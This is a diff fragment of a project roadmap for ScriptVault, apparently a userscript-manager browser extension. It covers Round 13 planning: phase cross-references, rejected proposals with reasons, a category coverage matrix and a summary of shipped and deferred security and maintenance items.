+- **Phase 39.35** (chrome-webstore-upload v4.0.0): **superseded by 40.18** — actual cutover lives at v6.0.0 (2026-05-12). v4 spec stays as historical record but the active work item is v6.
+- **Phase 13.11** (`chrome.storage.session`): explicit cross-reference added — 40.10 (DNR rule orphan reconciliation) depends on the same persistence pattern.
+- **Phase 1** (TypeScript migration): 40.13 (ResponseMap completeness) folded in as a hard exit criterion. Phase 1 isn't "done" until `messages.ts` covers every action.
+- **Phase 20** (Observability surface): 40.14 (leak probe) added as a non-blocking enhancement once the DevTools panel exists.
+- **Phase 8** (Sync rewrite): 40.12 (sync abort plumbing) sequenced as the first sub-task — it's a precondition for the larger CRDT-based merge work.
+
+### Round 13 — Items Already Shipped (audit-only — see "Verified Already-Fixed" table above)
+
+Four CLAUDE.md "known issues" entries documented as stale and removed from the source-of-truth doc; no code change required.
+
+### Round 13 — Items Rejected (with reasoning)
+
+| Item | Why Rejected |
+|------|--------------|
+| WECG #972 "raise 5,000 disabled-static-rule cap" | Out of band — ScriptVault doesn't ship a static-rule DNR ruleset. Re-evaluate only if Phase 26 advanced @match work depends on it. |
+| `@require` deprecation push (Userscripts #871) | Anti-modernist stance from one Safari-port maintainer; the wider ecosystem (TM, VM, SC, GM) actively maintains `@require`. ScriptVault keeps `@require` and tracks bundler/`import()` as a separate Later item. |
+| Premature `userScripts.execute()` one-shot UI ("Run on this page" button without registration) | Already covered by Phase 11.4's MAIN-world fallback work; do not duplicate as a 40.x. |
+| The "ScriptCat sub-agent / skill marketplace" item resurfaced by Agent 2 | Re-rejected per Round 12 — moderation + hosting burden disguised as a feature. |
+
+### Round 13 — Category Coverage Matrix (self-audit)
+
+The prompt enumerates 13 categories that every research pass should consciously cover or consciously exclude. Phase 40 coverage:
+
+| Category | Round 13 sub-items | Notes |
+|---|---|---|
+| Security | 40.2 (GM_cookie scheme), 40.4 (installFromUrl scheme), 40.9 (XSS defang), 40.10 (DNR orphan), 40.20 (npm audit), 40.23 (CVE-2026-8587) | Heavy coverage — this is the round's core. |
+| Accessibility | (none new) | Covered by Phases 14, 34. Round 13 had no a11y-specific signal. |
+| i18n / l10n | 40.22 (`getAvailableLanguages()`) | Tracked; non-blocking until the spec ships. |
+| Observability / telemetry | 40.14 (telemetry-free leak probe) | DevTools-panel-only — preserves zero-telemetry stance. |
+| Testing | 40.1, 40.2, 40.9 ship regression tests | 41 test files, 690 cases as of 2026-05-18. |
+| Docs | CLAUDE.md cleanup; ROADMAP update; release-runbook cross-ref at 40.18 | |
+| Distribution / packaging | 40.8 (publish.sh draft preservation), 40.18 (CWS upload v6 cutover), 40.23 (`minimum_chrome_version` bump) | |
+| Plugin ecosystem | N/A | ScriptVault IS the plugin host. Adjacent harvest at 40.25 supplies design patterns. |
+| Mobile | (none new) | Covered by Phase 29 PWA work + FIREFOX-PORT.md. No mobile-specific signal this week. |
+| Offline / resilience | 40.10 (DNR persistence), 40.12 (sync abort plumbing) | |
+| Multi-user / collab | N/A | Not a ScriptVault design goal; covered by Phase 31 governance for community-facing surface. |
+| Migration paths | 40.18 (chrome-webstore-upload v4 → v6) | |
+| Upgrade strategy | 40.18 + Phase 39.2 (CWS API v2 sunset 2026-10-15) | |
+
+Conscious exclusion: accessibility and mobile were intentionally light this round. Phase 14 (Accessibility & i18n) and Phase 29 (Mobile PWA) carry that work; Round 13's external sweep produced no fresh signal in either category. The audit-pass core (40.1–40.14) was bug-discovery in production code, so it doesn't naturally feed those categories.
+
+### Round 13 Completion Note
+
+Net-new sources: **22** (273–294). Cumulative source floor (>294 across Rounds 1–13) stays well above the 30–60 minimum.
+
+Phase 40 added **25 sub-items**:
+- **Nine already-shipped** (40.1–40.9, three commits on 2026-05-18 — adversarial code review found four real bugs plus four memory-leak hardenings plus one XSS).
+- **Five deferred internal-refactor items** (40.10–40.14 — DNR orphan, urlchange stack-up, sync abort plumbing, ResponseMap completeness, leak-probe DevTools surface).
+- **Eleven external-signal items** (40.15–40.25 — ScriptCat S3 sync, `@run-at context-menu` tolerance, C-indicator popup badge, CWS upload v6 cutover, fflate Zip64 fix, monaco dep audit sweep, WECG `async_initialization` + `getAvailableLanguages()` tracking, Chrome 148 CVE wave, GM `sourceURL` lesson, adjacent-tool pattern harvest).
+
+Round 13's value split: ~60% internal-quality work uncovered by adversarial code review of the v3.10.1 codebase (40.1–40.14); ~40% external-signal catch-up against the week-of-2026-05-18 platform / dependency / community surface (40.15–40.25). External delta from Round 12's 2026-05-17 sweep was bounded by the 24-hour window but real items shipped — ScriptCat in particular landed three commits worth tracking, and `chrome-webstore-upload-cli` v6 forces an unplanned config migration.
+
+No Round 13 item duplicates a Now/Next item from Rounds 1–12. Explicit promotions (Phase 21 S3, Phase 39.35 → 40.18, Phase 1 exit criteria) are cross-references, not duplicates. The Round 12 lesson on Greasemonkey-not-dead is reinforced: arantius shipped five more commits 2026-05-12 → 2026-05-15 (one of which — `sourceURL` removal — directly informs ScriptVault's audit posture at 40.24).
 
